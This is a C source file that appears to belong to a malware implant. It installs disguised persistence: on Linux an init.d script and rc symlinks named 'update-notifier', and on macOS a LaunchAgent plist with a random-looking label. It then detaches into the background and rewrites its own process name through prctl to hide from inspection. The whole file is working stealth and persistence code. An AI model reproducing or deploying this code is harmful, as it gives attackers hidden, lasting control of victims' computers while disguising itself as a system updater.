#include "system.h"

int persistent_launch_agent(char *agent) {

#if defined(__FreeBSD__)
    // persistent module freebsd
#endif

#if defined(__linux__)
    char *persistent_agent = "/etc/init.d/update-notifier";
    char *data_txt = "#!/bin/sh -e\n"
                     "### BEGIN INIT INFO\n"
                     "# Provides:          update-notifier\n"
                     "# Required-Start:    $local_fs\n"
                     "# Required-Stop:\n"
                     "# Default-Start:     S\n"
                     "# Default-Stop:\n"
                     "### END INIT INFO\n"
                     "\n"
                     "\n"
                     "case \"$1\" in\n"
                     "  *) echo \"Usage: $0 {start|stop|restart|force-reload}\" >&2; ;;\n"
                     "esac\n"
                     "\n"
                     "[ -x /usr/local/bin/update-notifier ] \\\n"
                     "\t&& exec /usr/local/bin/update-notifier";

    if (file_exists(persistent_agent) && file_exists(nix_bin_path)) {
        return 0;
    }

    if (geteuid() == 0) {
        FILE *init_file = fopen(persistent_agent, "w+");
        fputs(data_txt, init_file);
        fclose(init_file);

        chmod(persistent_agent, 0755);

        copyFile(agent, nix_bin_path);

        symlink(persistent_agent, "/etc/rc2.d/S01update-notifier");
        symlink(persistent_agent, "/etc/rc3.d/S01update-notifier");
        symlink(persistent_agent, "/etc/rc5.d/S01update-notifier");
    }

#endif

#if defined(__APPLE__)
    char *env_home = "HOME";
    const char *userpath = getenv(env_home);
    static char *buffer = NULL;
    static char *plist = NULL;

    char *data_xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                     "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
                     "<plist version=\"1.0\">"
                     "<dict>"
                     "<key>Label</key>"
                     "<string>com.xsbvhnrb.update-notifier</string>"
                     "<key>Program</key>"
                     "<string>/usr/local/bin/update-notifier</string>"
                     "<key>RunAtLoad</key><true/>"
                     "</dict>"
                     "</plist>";

    char *launch = "Library/LaunchAgents";
    char *persistent_com = "com.xsbvhnrb.update-notifier.plist";

    if (!userpath) {
        struct passwd *pwd = getpwuid(getuid());
        if (pwd)
            userpath = pwd->pw_dir;
    }

    int size = strlen(userpath) + strlen(launch) + 2;
    buffer = malloc(size);

    snprintf (buffer, size, "%s/%s", userpath, launch);

    if (!file_exists(buffer)) {
        mkdir(buffer, 0775);
    }

    copyfile_flags_t flags = COPYFILE_DATA;
    copyfile(agent, nix_bin_path, NULL, flags);


    size = strlen(buffer) + strlen(persistent_com) + 2;
    plist = malloc(size);
    snprintf(plist, size, "%s/%s", buffer, persistent_com);

    if (!file_exists(plist)) {
        FILE *plist_file = fopen(plist, "w");
        fputs(data_xml, plist_file);
        fclose(plist_file);
    }
#endif
    return EXIT_SUCCESS;
}


int into_background() {
#if defined(__unix__) || defined(__APPLE__)
    pid_t pid;

    pid = fork();
    if (pid < 0) exit (EXIT_FAILURE);
    if (pid > 0) exit (EXIT_SUCCESS);
    if (setsid() < 0) exit (EXIT_FAILURE);

    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    pid = fork();

    if (pid < 0) exit (EXIT_FAILURE);
    if (pid > 0) exit (EXIT_SUCCESS);

    umask(0);
    chdir("/");

    for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--)
        close(x);
#endif
    return EXIT_SUCCESS;
}

int set_process_name(char *name) {
    int r;

#if defined(__linux__)
    int i, len;
    static char *proctitle = NULL;
    char buf[2048], *tmp;
    FILE *f;

    unsigned long start_data, end_data, start_brk, start_code, end_code,
            start_stack, arg_start, arg_end, env_start, env_end,
            brk_val;
    struct prctl_mm_map prctl_map;
    char *proc_stat = "/proc/self/stat";
    f = fopen(proc_stat, "r");
    if (!f) {
        return EXIT_FAILURE;
    }

    tmp = fgets(buf, sizeof(buf), f);
    fclose(f);
    if (!tmp) {
        return EXIT_FAILURE;
    }

    tmp = strchr(buf, ' ');
    for (i = 0; i < 24; i++) {
        if (!tmp)
            return EXIT_FAILURE;
        tmp = strchr(tmp + 1, ' ');
    }
    if (!tmp)
        return EXIT_FAILURE;

    i = sscanf(tmp, "%lu %lu %lu", &start_code, &end_code, &start_stack);
    if (i != 3)
        return -1;

    for (i = 0; i < 19; i++) {
        if (!tmp)
            return EXIT_FAILURE;
        tmp = strchr(tmp + 1, ' ');
    }

    if (!tmp)
        return EXIT_FAILURE;

    i = sscanf(tmp, "%lu %lu %lu %*u %*u %lu %lu",
               &start_data,
               &end_data,
               &start_brk,
               &env_start,
               &env_end);
    if (i != 5)
        return -1;

    len = strlen(name) + 1;

    proctitle = malloc(len);
    if (!proctitle)
        return EXIT_FAILURE;

    arg_start = (unsigned long) proctitle;
    arg_end = arg_start + len;

    brk_val = syscall(__NR_brk, 0);

    prctl_map = (struct prctl_mm_map) {
            .start_code = start_code,
            .end_code = end_code,
            .start_stack = start_stack,
            .start_data = start_data,
            .end_data = end_data,
            .start_brk = start_brk,
            .brk = brk_val,
            .arg_start = arg_start,
            .arg_end = arg_end,
            .env_start = env_start,
            .env_end = env_end,
            .auxv = NULL,
            .auxv_size = 0,
            .exe_fd = -1,
    };

    r = prctl(PR_SET_MM, PR_SET_MM_MAP, (long) &prctl_map, sizeof(prctl_map), 0);
    if (r == EXIT_SUCCESS)
        strcpy((char *) arg_start, name);
#endif
    return r;
}
